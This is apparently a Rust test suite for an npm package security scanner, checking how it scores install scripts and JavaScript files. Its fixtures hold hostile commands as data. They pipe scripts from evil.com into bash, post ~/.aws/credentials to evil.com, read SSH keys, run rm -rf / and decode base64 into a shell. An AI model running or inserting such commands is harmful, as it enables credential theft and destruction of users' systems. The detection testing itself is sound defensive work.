use fnpm::security::{IssueSeverity, PackageAudit, RiskLevel, SecurityScanner, SourceCodeIssue};
use std::fs;
use tempfile::TempDir;

#[test]
#[ignore] // Requires npm to be installed and network access
fn test_audit_safe_package() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    std::env::set_current_dir(temp_dir.path()).expect("Failed to change dir");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Test with a known safe package (no scripts)
    let result = scanner.audit_package("is-number@7.0.0");

    match result {
        Ok(audit) => {
            assert_eq!(audit.risk_level, RiskLevel::Safe);
            assert!(!audit.has_scripts);
        }
        Err(e) => {
            eprintln!("Audit failed (may be network issue): {}", e);
        }
    }
}

#[test]
fn test_suspicious_pattern_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    // Create a malicious-looking package.json
    let malicious_content = r#"{
        "name": "test-malicious",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.com/steal.sh | bash"
        }
    }"#;

    fs::write(&package_json, malicious_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "test-malicious")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(!audit.suspicious_patterns.is_empty());
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("curl")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_risk_level_calculation() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");

    // Test different risk levels with new scoring system
    let test_cases = [
        (r#"{"name":"test","scripts":{}}"#, RiskLevel::Safe),
        (
            // Simple echo is now Safe (3 points for having script, no suspicious patterns)
            r#"{"name":"test","scripts":{"postinstall":"echo hello"}}"#,
            RiskLevel::Safe,
        ),
        (
            // curl adds suspicious pattern (8 points) + script (3) = 11 points = Low
            r#"{"name":"test","scripts":{"postinstall":"curl http://evil.com"}}"#,
            RiskLevel::Low,
        ),
        (
            // Multiple scripts with suspicious patterns + behavioral chain (curl + .ssh access)
            // Now Critical due to credential theft behavioral chain detection
            r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#,
            RiskLevel::Critical,
        ),
    ];

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    for (i, (json_content, expected_level)) in test_cases.iter().enumerate() {
        let package_json = temp_dir.path().join(format!("package{}.json", i));
        fs::write(&package_json, json_content).expect("Failed to write package.json");

        let audit = scanner
            .analyze_package_json(&package_json, "test")
            .expect("Failed to analyze");
        assert_eq!(
            audit.risk_level, *expected_level,
            "Failed for case: {}",
            json_content
        );
    }
}

#[test]
fn test_no_scripts_package() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let safe_content = r#"{
        "name": "safe-package",
        "version": "1.0.0",
        "description": "A safe package with no scripts"
    }"#;

    fs::write(&package_json, safe_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "safe-package")
        .expect("Failed to analyze");

    assert!(!audit.has_scripts);
    assert!(audit.suspicious_patterns.is_empty());
    assert_eq!(audit.preinstall, None);
    assert_eq!(audit.install, None);
    assert_eq!(audit.postinstall, None);
    assert_eq!(audit.risk_level, RiskLevel::Safe);
}

#[test]
fn test_eval_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let eval_content = r#"{
        "name": "eval-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e 'eval(process.argv[1])'"
        }
    }"#;

    fs::write(&package_json, eval_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "eval-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("eval")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_network_request_patterns() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let network_content = r#"{
        "name": "network-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://suspicious-domain.com/script.sh | sh"
        }
    }"#;

    fs::write(&package_json, network_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "network-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("curl")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_file_system_access_patterns() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let fs_content = r#"{
        "name": "fs-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "cat ~/.ssh/id_rsa && cat ~/.aws/credentials"
        }
    }"#;

    fs::write(&package_json, fs_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "fs-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("~/.ssh")));
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("~/.aws")));
    // Should at least be Low risk due to scripts, potentially higher
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_multiple_lifecycle_scripts() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let multi_script_content = r#"{
        "name": "multi-script-package",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "echo 'pre'",
            "install": "echo 'install'",
            "postinstall": "echo 'post'"
        }
    }"#;

    fs::write(&package_json, multi_script_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "multi-script-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.preinstall.is_some());
    assert!(audit.install.is_some());
    assert!(audit.postinstall.is_some());
    assert_eq!(audit.preinstall, Some("echo 'pre'".to_string()));
    assert_eq!(audit.install, Some("echo 'install'".to_string()));
    assert_eq!(audit.postinstall, Some("echo 'post'".to_string()));
}

#[test]
fn test_base64_obfuscation_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let obfuscated_content = r#"{
        "name": "obfuscated-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "echo 'base64 encoded' | base64 -d | bash"
        }
    }"#;

    fs::write(&package_json, obfuscated_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "obfuscated-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("base64")));
}

#[test]
fn test_child_process_execution() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let exec_content = r#"{
        "name": "exec-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e 'require(\"child_process\").exec(\"whoami\")'"
        }
    }"#;

    fs::write(&package_json, exec_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "exec-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("child_process")));
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("exec")));
}

#[test]
fn test_path_traversal_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let traversal_content = r#"{
        "name": "traversal-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "cat ../../../etc/passwd"
        }
    }"#;

    fs::write(&package_json, traversal_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "traversal-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("../") || p.contains("/etc/passwd")));
}

#[test]
fn test_critical_risk_level() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let critical_content = r#"{
        "name": "critical-package",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "curl http://evil.com/malware.sh | bash",
            "install": "wget http://bad.com/steal.sh && chmod +x steal.sh && ./steal.sh",
            "postinstall": "eval $(cat ~/.ssh/id_rsa) && curl -X POST -d @~/.aws/credentials http://evil.com"
        }
    }"#;

    fs::write(&package_json, critical_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "critical-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.len() >= 5);
    assert_eq!(audit.risk_level, RiskLevel::Critical);
}

#[test]
fn test_source_code_issue_severity() {
    let issue_critical = SourceCodeIssue {
        file_path: "index.js".to_string(),
        line_number: 10,
        issue_type: "eval() usage".to_string(),
        description: "Critical issue".to_string(),
        severity: IssueSeverity::Critical,
        code_snippet: None,
    };

    let issue_warning = SourceCodeIssue {
        file_path: "utils.js".to_string(),
        line_number: 20,
        issue_type: "HTTP request".to_string(),
        description: "Warning issue".to_string(),
        severity: IssueSeverity::Warning,
        code_snippet: None,
    };

    let issue_info = SourceCodeIssue {
        file_path: "config.js".to_string(),
        line_number: 30,
        issue_type: "Info".to_string(),
        description: "Info issue".to_string(),
        severity: IssueSeverity::Info,
        code_snippet: None,
    };

    assert_eq!(issue_critical.severity, IssueSeverity::Critical);
    assert_eq!(issue_warning.severity, IssueSeverity::Warning);
    assert_eq!(issue_info.severity, IssueSeverity::Info);
}

#[test]
fn test_risk_level_equality() {
    assert_eq!(RiskLevel::Safe, RiskLevel::Safe);
    assert_eq!(RiskLevel::Low, RiskLevel::Low);
    assert_eq!(RiskLevel::Medium, RiskLevel::Medium);
    assert_eq!(RiskLevel::High, RiskLevel::High);
    assert_eq!(RiskLevel::Critical, RiskLevel::Critical);

    assert_ne!(RiskLevel::Safe, RiskLevel::Low);
    assert_ne!(RiskLevel::Low, RiskLevel::Medium);
    assert_ne!(RiskLevel::Medium, RiskLevel::High);
    assert_ne!(RiskLevel::High, RiskLevel::Critical);
}

#[test]
fn test_empty_scripts_object() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let empty_scripts = r#"{
        "name": "empty-scripts",
        "version": "1.0.0",
        "scripts": {}
    }"#;

    fs::write(&package_json, empty_scripts).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "empty-scripts")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.is_empty());
    assert_eq!(audit.risk_level, RiskLevel::Safe);
}

#[test]
fn test_destructive_commands() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let destructive_content = r#"{
        "name": "destructive-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "rm -rf / --no-preserve-root"
        }
    }"#;

    fs::write(&package_json, destructive_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "destructive-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("rm -rf")));
    // Destructive commands should at least be Low risk or higher
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_git_clone_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let git_content = r#"{
        "name": "git-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "git clone https://github.com/malicious/repo.git && cd repo && npm install"
        }
    }"#;

    fs::write(&package_json, git_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "git-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("git clone")));
}

#[test]
#[ignore] // Requires npm and network access
fn test_transitive_dependency_scan() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    std::env::set_current_dir(temp_dir.path()).expect("Failed to change dir");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Test with a package that has dependencies (e.g., express has many)
    let result = scanner.scan_transitive_dependencies("lodash@4.17.21", 2);

    match result {
        Ok(scan_result) => {
            assert!(scan_result.total_packages > 0);
            assert!(scan_result.scanned_packages > 0);
            assert!(scan_result.max_depth_reached <= 2);
            // Lodash should be safe
            assert_eq!(scan_result.high_risk_count, 0);
        }
        Err(e) => {
            eprintln!("Transitive scan failed (may be network issue): {}", e);
        }
    }
}

#[test]
fn test_dependency_extraction() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let content_with_deps = r#"{
        "name": "test-package",
        "version": "1.0.0",
        "dependencies": {
            "lodash": "^4.17.21",
            "express": "^4.18.0"
        },
        "devDependencies": {
            "jest": "^29.0.0",
            "eslint": "^8.0.0"
        }
    }"#;

    fs::write(&package_json, content_with_deps).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "test-package")
        .expect("Failed to analyze");

    assert_eq!(audit.dependencies.len(), 2);
    assert!(audit.dependencies.contains(&"lodash".to_string()));
    assert!(audit.dependencies.contains(&"express".to_string()));

    assert_eq!(audit.dev_dependencies.len(), 2);
    assert!(audit.dev_dependencies.contains(&"jest".to_string()));
    assert!(audit.dev_dependencies.contains(&"eslint".to_string()));
}

#[test]
fn test_regexp_exec_not_flagged_as_system_exec() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Create a test JavaScript file with RegExp.exec() usage (legitimate)
    let test_file = temp_dir.path().join("regexp_test.js");
    let legitimate_regexp_code = r#"
// TypeScript-like code with RegExp.exec()
const firstNonWhitespaceCharacterRegex = new RegExp(/\S/);
const isJsx = isInsideJsxElement(sourceFile, lineStarts[firstLine]);
const openComment = isJsx ? "{/*" : "//";
for (let i = firstLine; i <= lastLine; i++) {
  const lineText = sourceFile.text.substring(lineStarts[i], sourceFile.getLineEndOfPosition(lineStarts[i]));
  const regExec = firstNonWhitespaceCharacterRegex.exec(lineText);
  
  // More common patterns
  while (matchArray = regExp.exec(fileContents)) {
    console.log(matchArray);
  }
  
  const pattern = /test/g;
  const result = pattern.exec(str);
}
"#;

    fs::write(&test_file, legitimate_regexp_code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-regexp".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    // Analyze the file
    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    // Should NOT flag RegExp.exec() as system command execution
    let has_system_exec_issue = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.issue_type.contains("System command execution"));

    assert!(
        !has_system_exec_issue,
        "RegExp.exec() should NOT be flagged as system command execution. Found issues: {:?}",
        audit.source_code_issues
    );

    // Should have no critical issues for this legitimate code
    let has_critical_issues = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.severity == IssueSeverity::Critical);

    assert!(
        !has_critical_issues,
        "Legitimate RegExp code should not have critical issues. Found: {:?}",
        audit.source_code_issues
    );
}

#[test]
fn test_child_process_exec_is_flagged() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Create a test JavaScript file with actual child_process.exec()
    let test_file = temp_dir.path().join("malicious_exec.js");
    let malicious_code = r#"
const { exec } = require('child_process');

exec('rm -rf /', (error, stdout, stderr) => {
  console.log(stdout);
});

const cp = require('child_process');
cp.execSync('curl http://evil.com | bash');
"#;

    fs::write(&test_file, malicious_code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-malicious".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    // Analyze the file
    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    // SHOULD flag child_process.exec() as system command execution
    let has_system_exec_issue = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.issue_type.contains("System command execution"));

    assert!(
        has_system_exec_issue,
        "child_process.exec() SHOULD be flagged as system command execution. Issues found: {:?}",
        audit.source_code_issues
    );
}

#[test]
fn test_new_function_with_obfuscation_is_critical() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    let test_file = temp_dir.path().join("obfuscated.js");
    let obfuscated_code = r#"
// Malicious: new Function with base64 obfuscation
const malicious = new Function(atob('Y29uc29sZS5sb2coInB3bmVkIik='));
malicious();

// Also malicious: eval with base64
eval(Buffer.from('bWFsaWNpb3VzX2NvZGU=', 'base64').toString());
"#;

    fs::write(&test_file, obfuscated_code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-obfuscated".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    // Should have critical issues due to obfuscation
    let has_critical_issues = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.severity == IssueSeverity::Critical);

    assert!(
        has_critical_issues,
        "new Function with obfuscation SHOULD be flagged as critical. Issues: {:?}",
        audit.source_code_issues
    );
}

#[test]
fn test_legitimate_new_function_is_warning_only() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    let test_file = temp_dir.path().join("compiler.js");
    let compiler_code = r#"
// TypeScript/Babel-like legitimate code generation
function compileTemplate(template) {
    return new Function('context', 'return ' + template);
}

const compiled = new Function('a', 'b', 'return a + b');
"#;

    fs::write(&test_file, compiler_code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-compiler".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    // Should NOT have critical issues (only warnings)
    let has_critical_issues = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.severity == IssueSeverity::Critical);

    assert!(
        !has_critical_issues,
        "Legitimate new Function should be WARNING, not CRITICAL. Issues: {:?}",
        audit.source_code_issues
    );

    // But should have some warnings
    let has_warnings = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.severity == IssueSeverity::Warning);

    assert!(has_warnings, "Should have warnings for new Function usage");
}

#[test]
fn test_arbitrary_regex_variable_not_flagged_fallback() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Fallback scanner: code with .exec() that should NOT be flagged
    let test_file = temp_dir.path().join("regex_fallback.js");
    let code = r#"
// Various regex .exec() patterns that must not trigger false positives
var x = /foo/;
x.exec(str);

const checker = new RegExp('bar');
checker.exec(input);

var a = /x/;
a.exec(b);

while (result = someVar.exec(text)) {
    console.log(result);
}
"#;

    fs::write(&test_file, code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-regex-fallback".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    let has_system_exec = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.issue_type.contains("System command execution"));

    assert!(
        !has_system_exec,
        "Regex .exec() patterns should NOT be flagged in fallback scanner. Found issues: {:?}",
        audit.source_code_issues
    );
}

#[test]
fn test_standalone_exec_still_flagged_fallback() {
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Standalone exec() with no object — should be flagged
    let test_file = temp_dir.path().join("standalone_exec.js");
    let code = r#"
exec('ls -la');
execSync('rm -rf /tmp/test');
"#;

    fs::write(&test_file, code).expect("Failed to write test file");

    let mut audit = PackageAudit {
        package_name: "test-standalone-exec".to_string(),
        has_scripts: false,
        preinstall: None,
        install: None,
        postinstall: None,
        suspicious_patterns: Vec::new(),
        source_code_issues: Vec::new(),
        risk_level: RiskLevel::Safe,
        dependencies: Vec::new(),
        dev_dependencies: Vec::new(),
        behavioral_chains: Vec::new(),
        risk_score: 0,
    };

    let content = fs::read_to_string(&test_file).expect("Failed to read test file");
    scanner.test_analyze_js_file(&test_file, &content, &mut audit);

    let has_system_exec = audit
        .source_code_issues
        .iter()
        .any(|issue| issue.issue_type.contains("System command execution"));

    assert!(
        has_system_exec,
        "Standalone exec() SHOULD be flagged as system command execution. Issues: {:?}",
        audit.source_code_issues
    );
}
